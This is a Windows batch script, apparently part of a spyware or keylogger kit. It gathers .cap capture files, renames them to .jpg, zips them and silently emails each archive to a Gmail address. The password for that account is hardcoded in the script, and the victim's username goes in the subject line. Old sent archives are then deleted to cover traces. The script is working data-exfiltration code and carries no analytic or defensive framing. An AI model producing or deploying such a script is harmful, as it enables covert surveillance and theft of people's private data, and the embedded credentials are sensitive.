@echo off

set BASEPATH=%ProgramFiles(x86)%
set APPLOC=%BASEPATH%\WC
set COLLECTDIR=%APPLOC%\collect
set READYDIR=%APPLOC%\ready
set ZIPEXEC=%APPLOC%\zip.exe
set SEEXEC=%APPLOC%\se.exe
set LOGFILE=%APPLOC%\wc.log
set /A FILEMAXAGE=20

echo %date% - %time%  Program start  >> "%LOGFILE%"
:: Check directories 
if not exist "%COLLECTDIR%" (
	mkdir "%COLLECTDIR%"
)
if not exist "%READYDIR%" (
	mkdir "%READYDIR%"
)

set dd = %date:~0,2%
set mm = %date:~3,2%
set yyyy = %date:~6,4%
set hh = %time:~0,2%
set mm = %time:~3,2%
set ss = %time:~6,2%
set num=%date:~6,4%-%date:~3,2%-%date:~0,2%_%time:~0,2%-%time:~3,2%-%time:~6,2%

:: Compress target directory & clean
set /a totalFiles=0 
for /f "tokens=* delims= " %%a in ('dir/s/b/a-d "%COLLECTDIR%\*.cap"') do (set /a totalFiles+=1) 
echo Total files %totalFiles% >> "%LOGFILE%"

if "%totalFiles%" GEQ "1" (
	goto compress
) else (
	goto end
)

:compress
echo Compressing files >> "%LOGFILE%"
cd "%COLLECTDIR%"
ren *.cap *.jpg
"%ZIPEXEC%" "%READYDIR%\%num%.zip" "*.jpg" >> "%LOGFILE%"
echo Cleaning files after compress >> "%LOGFILE%"
del *.jpg /S /Q
if not "%ErrorLevel%" == "1" (
	goto send
)

:send 
:: Send compress file 
echo Sending message for Batch %num% >> "%LOGFILE%"
"%SEEXEC%" -o tls=yes -f ardamax237@gmail.com -t ardamax237@gmail.com -s smtp.gmail.com:587 -xu ardamax237@gmail.com -xp C3POalfa -u "User: %USERNAME% - Batch %num%" -m "See attachment" -a "%READYDIR%\%num%.zip" -l "%APPLOC%\se-traffic.log"
if not "%ErrorLevel%" == "1" (
	goto clean
)

:clean 
:: Clean old files
echo Cleaning ZIP file >> "%LOGFILE%"
cd %READYDIR%
ren %num%.zip %num%.sent
echo Deleting files with max age %FILEMAXAGE% days >> "%LOGFILE%"
forfiles /P "%READYDIR%" /S /M *.sent /D -%FILEMAXAGE% /C "cmd /c del @path" 2>nul

:end
echo %date% - %time% Program end >> "%LOGFILE%"
exit /b 0